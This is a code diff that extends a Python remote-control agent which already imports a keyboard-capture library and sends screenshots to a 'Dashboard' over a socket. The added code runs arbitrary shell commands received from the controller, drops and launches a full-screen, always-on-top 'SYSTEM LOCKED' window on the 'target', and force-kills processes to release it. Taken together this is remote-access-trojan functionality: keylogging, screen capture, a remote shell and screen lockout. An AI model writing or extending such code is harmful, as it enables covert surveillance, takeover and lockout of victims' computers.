@@ -51,6 +51,7 @@ import threading
 import time
 import platform
 import psutil
+import subprocess
 from pynput import keyboard
 
 # ── Config ──────────────────────────────────────────────────
@@ -278,35 +279,72 @@ def send_initial_sys_info():
 
 def command_listener(sock):
     """Listens for commands sent from the Dashboard"""
+    import subprocess
+    import os
+    
     try:
         while True:
             data = sock.recv(1024).decode("utf-8")
             if not data:
                 break
             
-            # If the dashboard asks for a screenshot
+            # --- SCREENSHOT COMMAND ---
             if "CMD:SCREENSHOT" in data:
                 print("[Agent] Command received: Taking screenshot...")
-                
-                # 1. Take the screenshot
                 img = ImageGrab.grab()
-                
-                # 2. Compress it to a JPEG buffer to save network bandwidth
                 buffer = io.BytesIO()
                 img.save(buffer, format="JPEG", quality=70)
-                
-                # 3. Encode to Base64 text
                 img_b64 = base64.b64encode(buffer.getvalue()).decode("utf-8")
-                
-                # 4. Send it back
-                send_packet({
-                    "type": "screenshot_resp",
-                    "data": img_b64
-                })
+                send_packet({"type": "screenshot_resp", "data": img_b64})
                 print("[Agent] Screenshot sent.")
                 
+            # --- NEW: LOCK SCREEN COMMAND ---
+            elif "CMD:LOCK" in data:
+                print("[Agent] Initiating  Lockdown...")
+                # 1. Write a tiny Tkinter script to disk
+                lock_code = """import tkinter as tk
+root = tk.Tk()
+root.attributes('-fullscreen', True)
+root.attributes('-topmost', True)
+root.configure(bg='#0a0e27') # Dark Cyber Theme
+tk.Label(root, text="⚠ SYSTEM LOCKED ⚠", font=("Courier New", 50, "bold"), bg='#0a0e27', fg='#ff2e63').pack(expand=True)
+tk.Label(root, text="System Under Lockdown.", font=("Segoe UI", 20), bg='#0a0e27', fg='#00d9ff').pack(pady=20)
+root.mainloop()
+"""
+                with open("quarantine_lock.pyw", "w", encoding="utf-8") as f:
+                    f.write(lock_code)
+                
+                # 2. Run the script silently in the background
+                subprocess.Popen(["pythonw", "quarantine_lock.pyw"])
+                send_packet({"type": "cmd_output", "data": "Lockdown initiated. Target screen is Locked."})
+
+            # --- NEW: UNLOCK SCREEN COMMAND ---
+            elif "CMD:UNLOCK" in data:
+                print("[Agent] Releasing Quarantine...")
+                # Kill the python process running the lock screen
+                subprocess.call('taskkill /F /IM pythonw.exe /FI "WINDOWTITLE eq tk"', shell=True, stderr=subprocess.DEVNULL)
+                
+                # Clean up the file
+                if os.path.exists("quarantine_lock.pyw"):
+                    os.remove("quarantine_lock.pyw")
+                    
+                send_packet({"type": "cmd_output", "data": "Lockdown lifted. Target system restored."})
+                
+            # --- REMOTE SHELL COMMAND ---
+            elif data.startswith("CMD:EXEC:"):
+                command = data.split("CMD:EXEC:")[1].strip()
+                try:
+                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=15)
+                    output_str = output.decode("utf-8", errors="replace")
+                except subprocess.TimeoutExpired:
+                    output_str = "Error: Command timed out after 15 seconds."
+                except Exception as e:
+                    output_str = f"Error executing command:\n{str(e)}"
+                
+                send_packet({"type": "cmd_output", "data": output_str})
+                
     except Exception as e:
-        print(f"[Agent] Listener stopped.")
+        print(f"[Agent] Listener stopped: {e}")
 
 # ── Connection manager (auto-reconnect) ──────────────────────
 def connect_loop():
